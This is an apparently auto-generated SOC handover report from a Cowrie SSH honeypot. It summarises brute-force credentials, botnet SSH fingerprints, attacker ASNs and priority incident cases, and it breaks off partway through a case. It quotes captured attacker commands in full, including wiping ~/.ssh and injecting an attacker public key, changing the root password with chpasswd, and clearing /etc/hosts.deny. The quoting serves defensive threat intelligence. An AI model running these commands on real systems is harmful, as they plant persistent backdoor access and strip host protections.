# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-14 |
| **Generated At** | 2026-06-14T09:41:33Z |
| **Shift Time** | 09:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **867** |
| Confirmed Threats | **859** |
| False Positives Filtered | **8** (0.9%) |
| Unique Attacker IPs | **52** |
| Countries of Origin | **21** |
| High Severity Cases | **76** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **791** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **229** |
| Unique Credential Pairs | **147** |
| Unique Usernames | **106** |
| Unique Passwords | **120** |
| Successful Auth Pairs | **50** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 35 |
| `admin` | 6 |
| `app` | 2 |
| `dma` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 36 |
| `345gs5662d34` | 35 |
| `123456` | 20 |
| `123` | 7 |
| `admin` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 36 |
| `345gs5662d34` | `345gs5662d34` | 35 |
| `dma` | `dma` | 2 |
| `vikas` | `123` | 2 |
| `root` | `Hello2024@` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `idontknow` | `211.105.129.57` | 2026-06-14T04:53:13 |
| `root` | `3245gs5662d34` | `211.105.129.57` | 2026-06-14T04:53:16 |
| `root` | `Abc123456@` | `185.216.134.126` | 2026-06-14T04:56:30 |
| `root` | `3245gs5662d34` | `185.216.134.126` | 2026-06-14T04:56:34 |
| `root` | `Asdfgh123` | `211.105.129.57` | 2026-06-14T04:57:42 |
| `root` | `123456aA@` | `211.105.129.57` | 2026-06-14T05:05:44 |
| `root` | `Papa@1234` | `211.105.129.57` | 2026-06-14T05:07:52 |
| `root` | `123!@#aa` | `211.105.129.57` | 2026-06-14T05:20:05 |
| `root` | `123qweQWE!@#` | `211.105.129.57` | 2026-06-14T05:36:18 |
| `root` | `Debian2025` | `211.105.129.57` | 2026-06-14T05:42:34 |
| `root` | `1qaz!QAZ2wsx@WSX` | `211.105.129.57` | 2026-06-14T05:46:43 |
| `root` | `2wsx!QAZ3edc` | `211.105.129.57` | 2026-06-14T05:48:43 |
| `root` | `Ds123456789` | `190.167.237.191` | 2026-06-14T06:32:13 |
| `root` | `3245gs5662d34` | `190.167.237.191` | 2026-06-14T06:32:19 |
| `root` | `Hello2024@` | `190.167.237.191` | 2026-06-14T06:37:38 |
| `root` | `m12345678` | `119.96.174.235` | 2026-06-14T06:39:10 |
| `root` | `3245gs5662d34` | `119.96.174.235` | 2026-06-14T06:39:23 |
| `root` | `Cloud#123` | `186.57.3.137` | 2026-06-14T06:42:28 |
| `root` | `3245gs5662d34` | `186.57.3.137` | 2026-06-14T06:42:35 |
| `root` | `Gfhjkm123` | `190.167.237.191` | 2026-06-14T06:42:49 |
| `root` | `12131415` | `119.96.174.235` | 2026-06-14T06:45:40 |
| `root` | `pr0curv3` | `119.96.174.235` | 2026-06-14T06:49:24 |
| `root` | `Pass@2026` | `190.167.237.191` | 2026-06-14T06:58:42 |
| `root` | `Gfhjkm123` | `186.57.3.137` | 2026-06-14T06:59:28 |
| `root` | `admin123!` | `190.167.237.191` | 2026-06-14T07:04:06 |
| `root` | `Hello2024@` | `186.57.3.137` | 2026-06-14T07:06:29 |
| `root` | `wang@123456` | `186.57.3.137` | 2026-06-14T07:10:00 |
| `root` | `123456@Qwe` | `190.167.237.191` | 2026-06-14T07:12:40 |
| `root` | `Cloud#123` | `190.167.237.191` | 2026-06-14T07:14:30 |
| `root` | `iHgJmexzXT` | `39.106.230.113` | 2026-06-14T07:16:10 |
| `root` | `wang@123456` | `190.167.237.191` | 2026-06-14T07:21:38 |
| `root` | `Support@2025` | `103.187.147.165` | 2026-06-14T07:53:13 |
| `root` | `3245gs5662d34` | `103.187.147.165` | 2026-06-14T07:53:15 |
| `root` | `kjashd123sadhj123d1SS` | `115.190.161.6` | 2026-06-14T08:33:35 |
| `root` | `Qweasd123!` | `185.42.21.94` | 2026-06-14T08:38:02 |
| `root` | `3245gs5662d34` | `185.42.21.94` | 2026-06-14T08:38:08 |
| `root` | `123456*` | `85.124.219.6` | 2026-06-14T08:47:31 |
| `root` | `3245gs5662d34` | `85.124.219.6` | 2026-06-14T08:47:36 |
| `root` | `c9p5au8naa` | `85.124.219.6` | 2026-06-14T08:54:05 |
| `root` | `P@Ssw0rd!@#` | `85.124.219.6` | 2026-06-14T09:02:41 |
| `root` | `Qweasd123!` | `85.124.219.6` | 2026-06-14T09:06:00 |
| `root` | `1234560123` | `85.124.219.6` | 2026-06-14T09:07:39 |
| `root` | `000000` | `85.124.219.6` | 2026-06-14T09:11:00 |
| `root` | `love1234` | `85.124.219.6` | 2026-06-14T09:12:39 |
| `root` | `admin2025@` | `4.211.84.189` | 2026-06-14T09:19:31 |
| `root` | `3245gs5662d34` | `4.211.84.189` | 2026-06-14T09:19:35 |
| `root` | `hero123` | `85.124.219.6` | 2026-06-14T09:22:58 |
| `root` | `abc-123456` | `181.115.171.100` | 2026-06-14T09:27:56 |
| `root` | `3245gs5662d34` | `181.115.171.100` | 2026-06-14T09:28:03 |
| `root` | `1qaz@WSX3edc$RFV` | `85.124.219.6` | 2026-06-14T09:31:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **867** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 261 |
| Unknown | 3 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 179 | 16 |
| `03a80b21afa8...` | Modern SSH client | 76 | 7 |
| `748f8c627d3f...` | Mirai/variant | 1 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 179 | 16 | Mirai/variant |
| `03a80b21afa8...` | libssh | 76 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 35 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:aztJDTOsaqkx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `119.96.174.235`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `181.115.171.100`, `85.124.219.6`, `103.187.147.165`, `186.57.3.137`, `185.42.21.94`, `185.216.134.126`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **52** |
| Unique ASNs | **41** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS398101` | GoDaddy.com, LLC | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (76)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c88e8d5e625f

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 04:53 |
| **Last Seen** | 2026-06-14 04:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 04:53:12` | `cowrie.session.connect` |
| `2026-06-14 04:53:12` | `cowrie.client.version` |
| `2026-06-14 04:53:12` | `cowrie.client.kex` |
| `2026-06-14 04:53:13` | `cowrie.login.success` |
| `2026-06-14 04:53:13` | `cowrie.session.params` |
| `2026-06-14 04:53:13` | `cowrie.command.input` |
| `2026-06-14 04:53:13` | `cowrie.command.failed` |
| `2026-06-14 04:53:13` | `cowrie.log.closed` |
| `2026-06-14 04:53:13` | `cowrie.session.params` |
| `2026-06-14 04:53:13` | `cowrie.command.input` |
| `2026-06-14 04:53:13` | `cowrie.session.file_download` |
| `2026-06-14 04:53:13` | `cowrie.log.closed` |
| `2026-06-14 04:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd8d4d66aa6

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 04:53 |
| **Last Seen** | 2026-06-14 04:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 04:53:15` | `cowrie.session.connect` |
| `2026-06-14 04:53:15` | `cowrie.client.version` |
| `2026-06-14 04:53:16` | `cowrie.client.kex` |
| `2026-06-14 04:53:16` | `cowrie.login.success` |
| `2026-06-14 04:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614accabc43a

| Field | Detail |
|---|---|
| **Source IP** | `185.216.134[.]126` |
| **First Seen** | 2026-06-14 04:56 |
| **Last Seen** | 2026-06-14 04:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 04:56:29` | `cowrie.session.connect` |
| `2026-06-14 04:56:29` | `cowrie.client.version` |
| `2026-06-14 04:56:29` | `cowrie.client.kex` |
| `2026-06-14 04:56:30` | `cowrie.login.success` |
| `2026-06-14 04:56:30` | `cowrie.session.params` |
| `2026-06-14 04:56:30` | `cowrie.command.input` |
| `2026-06-14 04:56:30` | `cowrie.command.failed` |
| `2026-06-14 04:56:30` | `cowrie.log.closed` |
| `2026-06-14 04:56:31` | `cowrie.session.params` |
| `2026-06-14 04:56:31` | `cowrie.command.input` |
| `2026-06-14 04:56:31` | `cowrie.session.file_download` |
| `2026-06-14 04:56:31` | `cowrie.log.closed` |
| `2026-06-14 04:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.216.134[.]126` to AbuseIPDB if not already reported
- [ ] Block `185.216.134[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc50c32dbe50

| Field | Detail |
|---|---|
| **Source IP** | `185.216.134[.]126` |
| **First Seen** | 2026-06-14 04:56 |
| **Last Seen** | 2026-06-14 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 04:56:33` | `cowrie.session.connect` |
| `2026-06-14 04:56:33` | `cowrie.client.version` |
| `2026-06-14 04:56:33` | `cowrie.client.kex` |
| `2026-06-14 04:56:34` | `cowrie.login.success` |
| `2026-06-14 04:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.216.134[.]126` to AbuseIPDB if not already reported
- [ ] Block `185.216.134[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a119138e14d7

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 04:57 |
| **Last Seen** | 2026-06-14 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 04:57:41` | `cowrie.session.connect` |
| `2026-06-14 04:57:41` | `cowrie.client.version` |
| `2026-06-14 04:57:41` | `cowrie.client.kex` |
| `2026-06-14 04:57:42` | `cowrie.login.success` |
| `2026-06-14 04:57:42` | `cowrie.session.params` |
| `2026-06-14 04:57:42` | `cowrie.command.input` |
| `2026-06-14 04:57:42` | `cowrie.command.failed` |
| `2026-06-14 04:57:42` | `cowrie.log.closed` |
| `2026-06-14 04:57:43` | `cowrie.session.params` |
| `2026-06-14 04:57:43` | `cowrie.command.input` |
| `2026-06-14 04:57:43` | `cowrie.session.file_download` |
| `2026-06-14 04:57:43` | `cowrie.log.closed` |
| `2026-06-14 04:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c85ba8b0020

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 04:57 |
| **Last Seen** | 2026-06-14 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 04:57:45` | `cowrie.session.connect` |
| `2026-06-14 04:57:45` | `cowrie.client.version` |
| `2026-06-14 04:57:45` | `cowrie.client.kex` |
| `2026-06-14 04:57:45` | `cowrie.login.success` |
| `2026-06-14 04:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7547c5fe2a4

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:05 |
| **Last Seen** | 2026-06-14 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:05:43` | `cowrie.session.connect` |
| `2026-06-14 05:05:43` | `cowrie.client.version` |
| `2026-06-14 05:05:43` | `cowrie.client.kex` |
| `2026-06-14 05:05:44` | `cowrie.login.success` |
| `2026-06-14 05:05:44` | `cowrie.session.params` |
| `2026-06-14 05:05:44` | `cowrie.command.input` |
| `2026-06-14 05:05:44` | `cowrie.command.failed` |
| `2026-06-14 05:05:44` | `cowrie.log.closed` |
| `2026-06-14 05:05:44` | `cowrie.session.params` |
| `2026-06-14 05:05:44` | `cowrie.command.input` |
| `2026-06-14 05:05:44` | `cowrie.session.file_download` |
| `2026-06-14 05:05:44` | `cowrie.log.closed` |
| `2026-06-14 05:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2511009df10d

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:05 |
| **Last Seen** | 2026-06-14 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:05:47` | `cowrie.session.connect` |
| `2026-06-14 05:05:47` | `cowrie.client.version` |
| `2026-06-14 05:05:47` | `cowrie.client.kex` |
| `2026-06-14 05:05:47` | `cowrie.login.success` |
| `2026-06-14 05:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e1d6cd300c

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:07 |
| **Last Seen** | 2026-06-14 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:07:51` | `cowrie.session.connect` |
| `2026-06-14 05:07:51` | `cowrie.client.version` |
| `2026-06-14 05:07:51` | `cowrie.client.kex` |
| `2026-06-14 05:07:52` | `cowrie.login.success` |
| `2026-06-14 05:07:52` | `cowrie.session.params` |
| `2026-06-14 05:07:52` | `cowrie.command.input` |
| `2026-06-14 05:07:52` | `cowrie.command.failed` |
| `2026-06-14 05:07:52` | `cowrie.log.closed` |
| `2026-06-14 05:07:53` | `cowrie.session.params` |
| `2026-06-14 05:07:53` | `cowrie.command.input` |
| `2026-06-14 05:07:53` | `cowrie.session.file_download` |
| `2026-06-14 05:07:53` | `cowrie.log.closed` |
| `2026-06-14 05:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda12519756c

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:07 |
| **Last Seen** | 2026-06-14 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:07:55` | `cowrie.session.connect` |
| `2026-06-14 05:07:55` | `cowrie.client.version` |
| `2026-06-14 05:07:55` | `cowrie.client.kex` |
| `2026-06-14 05:07:55` | `cowrie.login.success` |
| `2026-06-14 05:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f75bbc4746

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:20 |
| **Last Seen** | 2026-06-14 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
